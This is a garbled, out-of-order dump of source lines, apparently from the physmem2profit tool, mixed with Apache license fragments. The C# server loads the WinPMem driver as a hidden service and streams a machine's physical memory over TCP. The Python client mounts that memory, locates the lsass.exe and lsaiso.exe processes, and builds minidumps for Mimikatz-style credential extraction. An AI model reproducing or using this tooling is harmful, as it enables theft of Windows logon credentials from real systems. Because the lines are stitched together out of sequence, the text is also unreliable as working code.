+"                    Program.Log(""Command for driver '"" "
+"                    Program.Log(""Couldn't register driver bridge: "" "
+"                    Program.Log(""Disconnecting... Component is still open for another connection."")"
+"                    Program.Log(""Found driver bridge: "" "
+"                    Program.Log(""New client is about to connect - aborting previous connection."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service already running."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service already stopped."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a continue-pending state. "", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a continue-pending state. Trying to stop it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a pause-pending state. Trying to start it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a pause-pending state. Trying to stop it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a start-pending state. Trying to stop it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a start-pending state."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a stop-pending state. Trying to start it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is in a stop-pending state."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is paused. Trying to start it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is paused. Trying to stop it..."", Program.LogMessageSeverity.Warning)"
+"                    Program.Log(""Service is running. Trying to stop it..."")"
+"                    Program.Log(""Service is stopped. Trying to start it..."")"
+"                    Program.Log(exception.Message, Program.LogMessageSeverity.Error)"
+"                    ShowWindow(GetConsoleWindow(), 0)"
+"                    ThrowWin32Exception(""Sending ParseMemoryRuns control code failed, windows error code"")"
+"                    _MemoryRuns.Add(Tuple.Create(BitConverter.ToUInt64(buffer, offset), BitConverter.ToUInt64(buffer, offset "
+"                    else if (commandLineArguments[i] == ""-h"" "
+"                    else if (commandLineArguments[i] == ""-i"" "
+"                    else if (commandLineArguments[i] == ""-v"" "
+"                    if (!QueryServiceStatusEx(serviceHandle, 0, pData, sizeof(SERVICE_STATUS_PROCESS), out _))"
+"                    if (commandLineArguments[i] == ""-p"" "
+"                    retDicionary.Add(Activator.CreateInstance(type) as ICommandReceiver, commands)"
+"                    return (SERVICE_STATUS_PROCESS) Marshal.PtrToStructure(pData, typeof(SERVICE_STATUS_PROCESS))"
+"                    severityCharacter = """
+"                    severityCharacter = ""-"""
+"                    throw new Exception(""Unable to get a handle to 'pmem' device object."")"
+"                    throw new Exception(""Wrong usage. Please provide the location of WinPMem driver."")"
+"                    var command = Encoding.Default.GetString(packet, nameEnd "
+"                    var commands = type.GetMethods().Where(y => y.GetCustomAttributes(typeof(Command), true).Length > 0).ToList()"
+"                    var methodEnd = Array.IndexOf(packet, (byte) 0x0A, nameEnd "
+"                   (uint) AccessRights.FILE_SHARE_WRITE, 0, 3, 0, 0)"
+"                (uint) AccessRights.SERVICE_DEMAND_START, (uint) AccessRights.SERVICE_ERROR_IGNORE, Path.GetFullPath(pathToDriver), null, null, null, null, null))"
+"                Array.Copy(buffer, 0, _MappingParameters, 0, _MappingParameters.Length)"
+"                Log(""Run in a context of a non-elevated user."", LogMessageSeverity.Warning)"
+"                Log(exception.Message, LogMessageSeverity.Error)"
+"                Program.Log(""Driver service started."", Program.LogMessageSeverity.Success)"
+"                Program.Log(""Exit command received. Terminating."", Program.LogMessageSeverity.Information)"
+"                Program.Log(""Installing service..."")"
+"                Program.Log(""Invalid length of arguments."", Program.LogMessageSeverity.Error)"
+"                Program.Log(""Registering driver bridges."")"
+"                Program.Log(""Service "" "
+"                Program.Log(""Service already opened."", Program.LogMessageSeverity.Warning)"
+"                Program.Log(""Service created successfully."", Program.LogMessageSeverity.Success)"
+"                Program.Log(""Starting service..."")"
+"                Program.Log(""Successfully installed the WinPMem driver."", Program.LogMessageSeverity.Success)"
+"                Program.Log(""Successfully unloaded the WinPMem driver."", Program.LogMessageSeverity.Success)"
+"                Program.Log(exception.Message, Program.LogMessageSeverity.Error)"
+"                Server = new Physerver(Settings.ListeningIp, Settings.ListeningPort, receivers)"
+"                ThrowWin32Exception(""Couldn't move file pointer."")"
+"                ThrowWin32Exception(""Couldn't read from driver."")"
+"                ThrowWin32Exception(""Failed to create service."")"
+"                ThrowWin32Exception(""Failed to delete service."")"
+"                ThrowWin32Exception(""Failed to get handle to SC Manager."")"
+"                ThrowWin32Exception(""Service Failed to start."")"
+"                ThrowWin32Exception(""Service Failed to stop."")"
+"                _hDevice = (System.IntPtr)CreateFile(_ServiceFileName, (uint) AccessRights.GENERIC_READ "
+"                byte[] mode = { 0x2, 0, 0, 0 }"
+"                if (!DeviceIoControl(_hDevice, INFO_IOCTRL, mode, (uint)mode.Length, buffer, (uint)buffer.Length, ref bytesReturned, IntPtr.Zero))"
+"                if (String.Compare(receiver.Key.GetType().Name, commandReceiverName, StringComparison.OrdinalIgnoreCase) == 0)"
+"                logging.debug("""
+"                logging.debug(""Advanced RVA %x bytes, tail length is %x"" % (rva-rva_before, len(tail)))"
+"                logging.debug(""Memory64ListStream should be at offset 0x%x"" % rva)"
+"                logging.debug(""MemoryInfoListStream should be at offset 0x%x"" % rva)"
+"                logging.debug(""MimikatzStream should be at offset 0x%x"" % rva)"
+"                logging.debug(""ModuleListStream should be at offset 0x%x"" % rva)"
+"                logging.debug(""SystemInfoStream should be at offset 0x%x"" % rva)"
+"                logging.debug(""Writing %x bytes of Memory64ListStream to offset %x"" % (len(stream), len(output)))"
+"                logging.debug(""Writing MemoryInfoListStream to offset 0x%x"" % len(output))"
+"                logging.debug(""Writing MimikatzStream to offset 0x%x"" % len(output))"
+"                logging.debug(""Writing ModuleListStream to offset 0x%x"" % len(output))"
+"                logging.debug(""Writing SystemInfoStream to offset 0x%x"" % len(output))"
+"                logging.debug(""rva is now %x"" % (rva))"
+"                logging.debug(""rva is now %x, output length is %x"" % (rva, len(output)))"
+"                rva, stream, blob = self._build_modulelist_stream(rva)"
+"                secure_world = _cg(s, vmem, label)"
+"                stream, blob = self._build_memory64_stream(rva)"
+"                stream, blob = self._build_systeminfo_stream(rva)"
+"                throw new ArgumentNullException(""Cannot start a service that was not open."")"
+"                throw new ArgumentNullException(""Cannot stop a service that was not open."")"
+"                throw new Exception(""Driver file does not exist."")"
+"                throw new Exception(""Wrong packet. Receiver not provided."")"
+"                var numberOfRuns = BitConverter.ToUInt64(buffer, sizeof(UInt64) "
+"            /// <param name=""commandLineArguments""></param>"
+"            AllocationBase=0,"
+"            AllocationProtect=0,"
+"            AllocationProtect=int(d['protect'].value),"
+"            Array.Copy(data, index, result, 0, length)"
+"            BaseAddress=d['start'].value,"
+"            BaseAddress=start,"
+"            Console.WriteLine(""["" "
+"            Continue = 0x00000003,"
+"            FILE_SHARE_READ = 0x00000001,"
+"            GENERIC_EXECUTE = 0x20000000,"
+"            GENERIC_READ = 0x80000000,"
+"            GENERIC_WRITE = 0x40000000,"
+"            Information,                                                                            ///< For typical/debug message."
+"            Interrogate = 0x00000004,"
+"            NetBindAdd = 0x00000007,"
+"            NetBindEnable = 0x00000009,"
+"            NetBindRemove = 0x00000008,"
+"            ParamChange = 0x00000006,"
+"            Pause = 0x00000002,"
+"            Program.Log(""Command/driver not recognized: "" "
+"            Program.Log(""Connected!"", Program.LogMessageSeverity.Success)"
+"            Program.Log(""Creating service "" "
+"            Program.Log(""Server Started."", Program.LogMessageSeverity.Success)"
+"            Program.Log(""Starting server on "" "
+"            Program.Log(""Waiting for a connection..."")"
+"            RegionSize=size,"
+"            SC_MANAGER_ALL_ACCESS = 0xF003F,"
+"            SC_MANAGER_CREATE_SERVICE = 0x00002,"
+"            SERVICE_ALL_ACCESS = 0xF01FF,"
+"            SERVICE_CONTINUE_PENDING = 0x00000005,"
+"            SERVICE_DEMAND_START = 0x00000003,"
+"            SERVICE_ERROR_IGNORE = 0x00000000,"
+"            SERVICE_KERNEL_DRIVER = 0x00000001,"
+"            SERVICE_PAUSED = 0x00000007,"
+"            SERVICE_PAUSE_PENDING = 0x00000006,"
+"            SERVICE_RUNNING = 0x00000004,"
+"            SERVICE_START_PENDING = 0x00000002,"
+"            SERVICE_STOPPED = 0x00000001,"
+"            SERVICE_STOP_PENDING = 0x00000003,"
+"            Shutdown = 0x00000005,"
+"            Stop = 0x00000001,"
+"            Success,                                                                                ///< Indicates a successful action."
+"            Warning,                                                                                ///< An important information."
+"            _TcpListener = new TcpListener(ip, tcpPort)"
+"            _hScManager = new ServiceHandle(OpenSCManager(null, null, (uint)AccessRights.SC_MANAGER_ALL_ACCESS))"
+"            _handle = new ServiceHandle(CreateService(_hScManager.Handle, _serviceName, _serviceName, (uint) AccessRights.SERVICE_ALL_ACCESS, (uint) AccessRights.SERVICE_KERNEL_DRIVER,"
+"            _handle = new ServiceHandle(OpenService(_hScManager.Handle, _serviceName, (uint)AccessRights.SERVICE_ALL_ACCESS))"
+"            byte[] packet = new byte[BitConverter.ToUInt64(args, 8)]"
+"            data = addr_space.read(start, size)"
+"            if (!ReadFile(_hDevice, packet, (uint)packet.Length, out uint bytesRead, IntPtr.Zero))"
+"            if (!SetFilePointerEx(_hDevice, (long)BitConverter.ToUInt64(args, 0), IntPtr.Zero, 0))"
+"            if (!StartService(_handle.Handle, 0, null))"
+"            if (ControlService(_handle.Handle, ServiceControl.Stop, status) == 0)"
+"            if (commandReceiverName == ""exit"")"
+"            int packetLength = BitConverter.ToInt32(ReadFixedNumberOfBytesFromStream(clientStream, 4), 0)"
+"            jobs.append(Process(target=lambda: mount.mount(socket, args.driver, args.install)))     "
+"            jobs.append(Process(target=lambda: physmem2minidump.dump(args.label, args.vmem)))"
+"            json.dump(config, f)"
+"            mem = I.closedopen(start, end)"
+"            memory_ranges.append(dict(StartOfMemoryRange=start, DataSize=size))"
+"            module = dict(BaseOfImage=m[1], SizeOfImage=m[2], ModuleNameRva=rva)"
+"            module_list.append((dll['dll_path'].v(), dll['base'].v(), dll['size'].v()))"
+"            os.remove(""config.json"")"
+"            print(""[!] .vmss file is most likely required. If you have a .vmsn file, please rename it to .vmss and try again"")"
+"            print(""["
+"            print(""[-] Image file must have .vmem file extension when using the --vmem switch"")"
+"            public static IPAddress ListeningIp = IPAddress.Parse(""127.0.0.1"")"
+"            raise Exception(""[-] --vmem specified but file %s does not exist"" % (args.vmem))"
+"            raise Exception(""[-] Pleae use --mode dump with --vmem switch"")"
+"            raise Exception(struct.unpack(""<%ds"" % response, self.socket.recv(response))[0].decode('utf-8'))"
+"            ref uint lpBytesReturned, IntPtr lpOverlapped)"
+"            return ReadFixedNumberOfBytesFromStream(clientStream, packetLength)"
+"            s = dict(StreamType=t,Location={})"
+"            self.runs.append((start,size))"
+"            socket = mount.init(args.host, args.port)                                               "
+"            start, size = struct.unpack(""<QQ"", received)"
+"            start, size, data = m"
+"            string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword)"
+"            string severityCharacter = """
+"            var commandReceiverName = Encoding.Default.GetString(packet, 0, nameEnd)"
+"            var nameEnd = Array.IndexOf(packet, (byte) 0x0A)"
+"            var retDicionary = new Dictionary<ICommandReceiver, List<MethodInfo>>()"
+"          attribution notices from the Source form of the Work,"
+"          distribution, then any Derivative Works that You distribute must"
+"          documentation, if provided along with the Derivative Works"
+"          notices within Derivative Works that You distribute, alongside"
+"          or as an addendum to the NOTICE text from the Work, provided"
+"          pertain to any part of the Derivative Works, in at least one"
+"          that You distribute, all copyright, patent, trademark, and"
+"          within a display generated by the Derivative Works, if and"
+"          within such NOTICE file, excluding those notices that do not"
+"        /// <param name=""_"">Unused</param>"
+"        /// <param name=""args"">Application command-line arguments</param>"
+"        /// <param name=""args"">offset and length of memory to read</param>"
+"        /// <param name=""args"">relative or absolute path to the pmem driver file</param>"
+"        /// <param name=""clientStream"">Client's network stream.</param>"
+"        /// <param name=""clientStream"">NetworkStream of a connected TCP client</param>"
+"        /// <param name=""clientStream"">TCP client's NetworkStream object.</param>"
+"        /// <param name=""clientStream"">stream to read packet from.</param>"
+"        /// <param name=""ip"">Address to listen for commands on.</param>"
+"        /// <param name=""length"">number of bytes to read</param>"
+"        /// <param name=""message"">message to log.</param>"
+"        /// <param name=""operationDescription"">Optional description of an action that resulted with exception being thrown.</param>"
+"        /// <param name=""pathToDriver"">Relative or absolute path to the driver.</param>"
+"        /// <param name=""receivers"">List of all commands receivers.</param>"
+"        /// <param name=""serviceHandle"">handle to service to query status of.</param>"
+"        /// <param name=""serviceName"">Name of the service. Used both as full name and display name.</param>"
+"        /// <param name=""severity"">type of the message.</param>"
+"        /// <param name=""stream"">stream to read bytes from</param>"
+"        /// <param name=""tcpPort"">TCP port used to listen for commands.</param>"
+"        /// A handy function that calls GetLastError then throws an Exception that contains that error code, description and an optional message."
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.5""/>"
+"        Memory64ListStream: Computed(lambda this: get_string(Pointer(this.Location.RVA, minidump_memory64_list))),"
+"        MemoryInfoListStream: Computed(lambda this: get_string(Pointer(this.Location.RVA, minidump_memory_info_list))),"
+"        ModuleListStream: Computed(lambda this: get_string(Pointer(this.Location.RVA, minidump_module_list))),"
+"        SystemInfoStream: Computed(lambda this: get_string(Pointer(this.Location.RVA, minidump_system_info))),"
+"        [DllImport(""advapi32"", EntryPoint = ""OpenSCManagerW"", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Unicode)]"
+"        [DllImport(""advapi32"", SetLastError = true)]"
+"        [DllImport(""advapi32"", SetLastError = true, CharSet = CharSet.Auto)]"
+"        [DllImport(""advapi32"", SetLastError = true, CharSet = CharSet.Unicode)]"
+"        [DllImport(""advapi32.dll"", SetLastError = true)]"
+"        [DllImport(""advapi32.dll"", SetLastError = true, CharSet = CharSet.Unicode)]"
+"        [DllImport(""kernel32"", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Auto)]"
+"        [DllImport(""kernel32"", SetLastError = true)]"
+"        [DllImport(""kernel32.dll"")]"
+"        [DllImport(""kernel32.dll"", SetLastError = true)]"
+"        [DllImport(""user32.dll"")]"
+"        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]"
+"        _dump(label, vmem)"
+"        autodetect=[""rsds""],"
+"        autodetect_build_local = ""basic"","
+"        cache = ""timed"","
+"        cache_dir = "".rekall_cache"","
+"        checkArgument(args.host, ""'host'"")"
+"        checkArgument(args.install, ""'install'"")"
+"        config = dict(dtb=dtb, kernel_base=kernel_base, build=build, image=os.path.join(mountpoint, self.FILENAME))"
+"        data = s.default_address_space.base.read(addr, PAGE_SIZE)"
+"        data2 = self.read_cached(path, requested_length, offset, fh)"
+"        dirents = ['.', '..', self.FILENAME]"
+"        dtb, build, kernel_base, n = struct.unpack(""<QQQQ"", received)"
+"        dtb=(config['dtb'] if 'dtb' in config else None),"
+"        elif path == os.path.join('/', self.FILENAME):"
+"        filename=config['image'],"
+"        for i,d in enumerate(stream_data):"
+"        for pagenum in range(offset // self.PAGE_SIZE, (offset"
+"        for start, end in mem_list:"
+"        for start,size in self.runs:"
+"        fuse = FUSE(Physmem(sock, mountpoint, driver, installArguments), mountpoint, nothreads=True, foreground=True)"
+"        hdr = MINIDUMP_HEADER.build(dict(NumberOfStreams=self.STREAM_COUNT, StreamDirectoryRva=self.MINIDUMP_HEADER_LEN))"
+"        if (removeOldConfig and os.path.exists(""config.json"")):"
+"        if image_ext != "".vmem"":"
+"        if path == ""/"":"
+"        if str(row['_EPROCESS'].name).lower() == ""lsaiso.exe"":"
+"        if str(row['_EPROCESS'].name).lower() == ""lsass.exe"":"
+"        image_base, image_ext = os.path.splitext(vmem)"
+"        internal static void Log(String message, LogMessageSeverity severity = LogMessageSeverity.Information)"
+"        kernel_base=(config['kernel_base'] if 'kernel_base' in config else None),"
+"        logger=logging.getLogger(),"
+"        logging.debug(""Building minidump"")"
+"        logging.debug(""Done"")"
+"        logging.debug(""Expected tail start: %x, got: %x"" % (expected_tail_start, len(output)))"
+"        logging.debug(""RVA1: %x"" % (rva))"
+"        logging.debug(""RVA2: %x"" % (rva))"
+"        logging.debug(""Setting memory64 list"")"
+"        logging.debug(""Setting memoryinfo list"")"
+"        logging.debug(""Setting module list"")"
+"        logging.debug(""Setting systeminfo"", si)"
+"        logging.debug(""These should match: %u %u"" % (len(output) "
+"        memory64_list.append((start, size, data))"
+"        mod = I.closedopen(mod_start, mod_start "
+"        msg = struct.pack(""<I%ds"" % len(order), len(order), order)"
+"        msg = struct.pack(""<I%dsQQ"" % len(order), len(order) "
+"        operations.append((start, end, 'mem'))"
+"        operations.append((x.lower, x.upper, 'pad'))"
+"        pfn_obj = s.profile.get_constant_object(""MmPfnDatabase"")[pfn]"
+"        print(""Not implemented yet"")"
+"        print(""[!] .vmss file is most likely required. If you have a .vmsn file, please rename it to .vmss and try again"")"
+"        print(""["
+"        print(""[-] No LSASS found"")"
+"        private Byte[] ReadFixedNumberOfBytesFromStream(NetworkStream stream, int length)"
+"        private Dictionary<ICommandReceiver, List<MethodInfo>> _Receivers"
+"        private static Dictionary<ICommandReceiver, List<MethodInfo>> GatherCommandReceivers()"
+"        private static byte[] SubArray(byte[] data, int index, int length)"
+"        private static extern int ShowWindow(int Handle, int showState)"
+"        protected List<Tuple<UInt64, UInt64>> _MemoryRuns = new List<Tuple<ulong, ulong>>()"
+"        protected static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl,"
+"        protected static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess)"
+"        protected static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess)"
+"        protected static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, byte[] inBuffer, uint nInBufferSize, byte[] lpOutBuffer, uint nOutBufferSize,"
+"        protected static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)"
+"        protected static extern bool SetFilePointerEx(IntPtr hFile, long liDistanceToMove, IntPtr lpNewFilePointer, uint dwMoveMethod)"
+"        protected static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors)"
+"        protected static extern int ControlService(IntPtr serviceHandle, ServiceControl controlCode, SERVICE_STATUS lpServiceStatus)"
+"        protected static extern int CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes,"
+"        protected static extern unsafe bool QueryServiceStatusEx(IntPtr serviceHandle, int infoLevel, IntPtr buffer, int bufferSize, out int bytesNeeded)"
+"        public Physerver(IPAddress ip, UInt16 tcpPort, Dictionary<ICommandReceiver, List<MethodInfo>> receivers)"
+"        raise Exception(""[-] Failed to connect, quitting"")"
+"        repository_path = ['https://github.com/google/rekall-profiles/raw/master', 'http://profiles.rekall-forensic.com'],"
+"        response = struct.unpack(""<I"", received)[0]"
+"        return MINIDUMP_MEMORY_INFO_LIST.build(dict(NumberOfEntries=len(self.memoryinfo), memory_infos=self.memoryinfo))"
+"        return rva, stream, blobs"
+"        return stream, blob"
+"        self.FILENAME = ""memimage.raw"""
+"        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
+"        sock.connect((host, port))"
+"        static private readonly string _ServiceFileName = @"""
+"        static private readonly string _ServiceName = ""physmem2profit"""
+"        stream = MINIDUMP_MEMORY64_LIST.build(dict(NumberOfMemoryRanges=len(self.memory64), BaseRva=BaseRva, MemoryRanges=memory_ranges))"
+"        stream = MINIDUMP_MODULE_LIST.build(dict(NumberOfModules=len(modules), modules=modules))"
+"        wanted_streams = [Memory64ListStream, MemoryInfoListStream, SystemInfoStream, ModuleListStream]"
+"        with open('config.json', 'w') as f:"
+"      ""Contribution"" shall mean any work of authorship, including"
+"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
+"      ""Derivative Works"" shall mean any work, whether in Source or Object"
+"      ""Legal Entity"" shall mean the union of the acting entity and all"
+"      ""License"" shall mean the terms and conditions for use, reproduction,"
+"      ""Licensor"" shall mean the copyright owner or entity authorized by"
+"      ""Object"" form shall mean any form resulting from mechanical"
+"      ""Source"" form shall mean the preferred form for making modifications,"
+"      ""Work"" shall mean the work of authorship, whether in Source or"
+"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
+"      ""control"" means (i) the power, direct or indirect, to cause the"
+"      (c) You must retain, in the Source form of any Derivative Works"
+"      (d) If the Work includes a ""NOTICE"" text file as part of its"
+"      (except as stated in this section) patent license to make, have made,"
+"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
+"      License. However, in accepting such obligations, You may act only"
+"      Licensor for the purpose of discussing and improving the Work, but"
+"      Notwithstanding the above, nothing herein shall supersede or modify"
+"      Object form, made available under the License, as indicated by a"
+"      To apply the Apache License to your work, attach the following"
+"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
+"      Work (including but not limited to damages for loss of goodwill,"
+"      Work or Derivative Works thereof in any medium, with or without"
+"      agreed to in writing, Licensor provides the Work (and each"
+"      and charge a fee for, acceptance of support, warranty, indemnity,"
+"      and issue tracking systems that are managed by, or on behalf of, the"
+"      boilerplate notice, with the fields enclosed by brackets ""[]"""
+"      communication on electronic mailing lists, source code control systems,"
+"      control with that entity. For the purposes of this definition,"
+"      copyright license to reproduce, prepare Derivative Works of,"
+"      defend, and hold each Contributor harmless for any liability"
+"      designated in writing by the copyright owner as ""Not a Contribution."""
+"      direction or management of such entity, whether by contract or"
+"      editorial revisions, annotations, elaborations, or other modifications"
+"      for any such Derivative Works as a whole, provided Your use,"
+"      for use, reproduction, or distribution of Your modifications, or"
+"      form, that is based on (or derived from) the Work and for which the"
+"      implied, including, without limitation, any warranties or conditions"
+"      incidental, or consequential damages of any character arising as a"
+"      including but not limited to software source code, documentation"
+"      incurred by, or claims asserted against, such Contributor by reason"
+"      liable to You for damages, including any direct, indirect, special,"
+"      means any form of electronic, verbal, or written communication sent"
+"      modifications, and in Source or Object form, provided that You"
+"      names, trademarks, service marks, or product names of the Licensor,"
+"      negligent acts) or agreed to in writing, shall any Contributor be"
+"      not limited to compiled object code, generated documentation,"
+"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
+"      of any other Contributor, and only if You agree to indemnify,"
+"      of this License, Derivative Works shall not include works that remain"
+"      on Your own behalf and on Your sole responsibility, not on behalf"
+"      or contributory patent infringement, then any patent licenses"
+"      other commercial damages or losses), even if such Contributor"
+"      other entities that control, are controlled by, or are under common"
+"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
+"      outstanding shares, or (iii) beneficial ownership of such entity."
+"      publicly display, publicly perform, sublicense, and distribute the"
+"      represent, as a whole, an original work of authorship. For the purposes"
+"      reproduction, and distribution of the Work otherwise complies with"
+"      same ""printed page"" as the copyright notice for easier"
+"      separable from, or merely link (or bind by name) to the interfaces of,"
+"      source, and configuration files."
+"      the Work or Derivative Works thereof, You may choose to offer,"
+"      the copyright owner. For the purposes of this definition, ""submitted"""
+"      this License, each Contributor hereby grants to You a perpetual,"
+"      this License, without any additional terms or conditions."
+"      to that Work or Derivative Works thereof, that is intentionally"
+"      to the Licensor or its representatives, including but not limited to"
+"      transformation or translation of a Source form, including but"
+"      use, offer to sell, sell, import, and otherwise transfer the Work,"
+"      whether in tort (including negligence), contract, or otherwise,"
+"      work stoppage, computer failure or malfunction, or any and all"
+"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
+"    ""AllocationBase"" / Hex(Int64ul),"
+"    ""AllocationProtect"" / Hex(Int32ul),"
+"    ""BaseAddress"" / Hex(Int64ul),"
+"    ""BaseOfImage"" / Hex(Int64ul),"
+"    ""BaseRva"" / Hex(Int64ul),"
+"    ""BuildNumber"" / Int32ul,"
+"    ""CPUInformation"" / Default(Int32ul[6], [0,0,0,0,0,0])"
+"    ""CSDVersionRva"" / Hex(Int32ul),"
+"    ""CheckSum"" / Default(Int32ul, 0),"
+"    ""Checksum"" / Default(Hex(Int32ul), 0),"
+"    ""CvRecord"" / Default(minidump_location_descriptor, dict(RVA=0, DataSize=0)),"
+"    ""Data"" / Switch(this.StreamType, {"
+"    ""DataSize"" / Hex(Int64ul),"
+"    ""DataSize"" / Int32ul,"
+"    ""Directory"" / Computed(lambda this: get_string(Pointer(this.StreamDirectoryRva, minidump_directory[this.NumberOfStreams])))"
+"    ""Flags"" / Default(Hex(Int64ul), 0x421826),"
+"    ""Location"" / minidump_location_descriptor,"
+"    ""MajorVersion"" / Int32ul,"
+"    ""Memory"" / minidump_location_descriptor,"
+"    ""MemoryRanges"" / MINIDUMP_MEMORY_DESCRIPTOR64[this.NumberOfMemoryRanges]"
+"    ""MinorVersion"" / Int32ul,"
+"    ""MiscRecord"" / Default(minidump_location_descriptor, dict(RVA=0, DataSize=0)),"
+"    ""ModuleNameRva"" / Hex(Int32ul),"
+"    ""NumberOfEntries"" / Int64ul,"
+"    ""NumberOfMemoryRanges"" / Int64ul,"
+"    ""NumberOfModules"" / Int32ul,"
+"    ""NumberOfProcessors"" / Default(Int8ul, 1),"
+"    ""NumberOfStreams"" / Int32ul,"
+"    ""PlatformId"" / Default(Int32ul, 0),"
+"    ""ProcessorArchitecture"" / Default(Int16ul, 9),"
+"    ""ProcessorLevel"" / Default(Int16ul, 6),"
+"    ""ProcessorRevision"" / Default(Int16ul, 0),"
+"    ""ProductType"" / Default(Int8ul, 0),"
+"    ""Protect"" / Hex(Int32ul),"
+"    ""RVA"" / Int32ul"
+"    ""RegionSize"" / Int64ul,"
+"    ""Reserved0"" / Default(Int64ul, 0),"
+"    ""Reserved1"" / Default(Int32ul, 0),"
+"    ""Reserved1"" / Default(Int64ul, 0),"
+"    ""Signature"" / Const(MINIDUMP_SIGNATURE),"
+"    ""SizeOfEntry"" / Default(Int32ul, MINIDUMP_MEMORY_INFO.sizeof()),"
+"    ""SizeOfHeader"" / Default(Int32ul, 16),"
+"    ""SizeOfImage"" / Int32ul,"
+"    ""StartOfMemoryRange"" / Hex(Int64ul),"
+"    ""State"" / Int32ul,"
+"    ""StreamDirectoryRva"" / Hex(Int32ul),"
+"    ""StreamType"" / Int32ul,"
+"    ""String"" / PascalString(Int32ul, ""utf_16_le""),"
+"    ""TimeDateStamp"" / Default(Int32ul, 0),"
+"    ""Type"" / Int32ul,"
+"    ""Version"" / Const(MINIDUMP_VERSION),"
+"    ""VersionInfo"" / VS_FIXEDFILEINFO,"
+"    ""VersionInternal"" / Default(Int16ul, 0),"
+"    ""ZeroTermination"" / Const(b'"
+"    ""__alignment1"" / Default(Int32ul, 0),"
+"    ""__alignment2"" / Default(Int32ul, 0)"
+"    ""dwFileDateLS"" / Default(Int32ul, 0)"
+"    ""dwFileDateMS"" / Default(Int32ul, 0),"
+"    ""dwFileFlags"" / Default(Hex(Int32ul), 0),"
+"    ""dwFileFlagsMask"" / Default(Hex(Int32ul), 0),"
+"    ""dwFileOS"" / Default(Int32ul, 0),"
+"    ""dwFileSubType"" / Default(Int32ul, 0),"
+"    ""dwFileType"" / Default(Int32ul, 0),"
+"    ""dwFileVersionLS"" / Default(Int32ul, 0),"
+"    ""dwFileVersionMS"" / Default(Int32ul, 0),"
+"    ""dwProductVersionLS"" / Default(Int32ul, 0),"
+"    ""dwProductVersionMS"" / Default(Int32ul, 0),"
+"    ""dwSignature"" / Hex(Const(VS_FIXEFILEINFO_SIGNATURE, Int32ul)),"
+"    ""dwStructVersion"" / Default(Int32ul, 0),"
+"    ""memory_infos"" / MINIDUMP_MEMORY_INFO[this.NumberOfEntries]"
+"    ""modules"" / MINIDUMP_MODULE[this.NumberOfModules]"
+"    ///         Program.Log(""SampleCommand called."")"
+"    ///     void SampleCommand(NetworkStream clientStream, byte[] _)"
+"    <Compile Include=""Core"
+"    <Compile Include=""Plugins"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <None Include=""App.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.ServiceProcess"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    def __init__(self, sock, mountpoint, driver, installArguments):"
+"    def _build_memory64_stream(self, BaseRva):"
+"    def _build_modulelist_stream(self, rva):"
+"    def _build_systeminfo_stream(self, rva):"
+"    def _gather_page(self, pagenum):"
+"    def append(self, data, extra):"
+"    def getattr(self, path, fh=None):"
+"    def open(self, path, flags):"
+"    def parse(self, data):"
+"    def parsefile(self, filepath):"
+"    def read(self, path, requested_length, offset, fh):"
+"    def read_cached(self, path, requested_length, offset, fh):"
+"    def read_uncached(self, path, requsted_length, offset, fh):"
+"    def readdir(self, path, fh):"
+"    def set_memory64(self, m64_list):"
+"    def set_memoryinfo_list(self, mi_list):"
+"    def set_module_list(self, module_list):"
+"    def set_secure_world(self, secure_world):"
+"    def set_systeminfo(self, si):"
+"    def write(self, path, buf, offset, fh):"
+"    filepath = 'output/%s-%s-lsass.dmp' % (label, datetime.datetime.now().strftime(""%Y-%m-%d""))"
+"    filepath = 'output/%s-%s-secure-world.raw' % (label, datetime.datetime.now().strftime(""%Y-%m-%d""))"
+"    for a, mod_start, size in module_list:"
+"    for start, end in mem_list:"
+"    for start, end, count in s.plugins.phys_map().collect():"
